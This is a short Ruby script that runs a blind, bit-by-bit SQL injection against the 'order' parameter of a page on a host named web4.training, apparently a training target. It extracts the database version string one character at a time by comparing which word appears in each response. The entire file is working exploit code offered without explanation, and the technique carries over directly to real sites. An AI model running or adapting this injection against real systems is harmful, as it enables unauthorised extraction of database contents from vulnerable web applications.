require "net/http"
require "uri"

url = URI.parse("http://web4.training/all.php")

headers = {"Cookie" => 'oh=exploitable'}

i = 1
char = 1
puts "Starting"
until char == 0
    char = 0
    (0..7).each do |bit|
        data = "?order=if+(ASCII(substring((select+@@version),#{i},1))%26#{2**bit},id,title)"
        req = url.request_uri+data
        response = Net::HTTP.start(url.host, url.port) do |http|
            http.get(req, headers)
        end
        char += /cthulhu|hacker/.match(response.body).to_s =~ /hacker/ ? 2**bit : 0
    end
    print "%c" % char
    i += 1
end
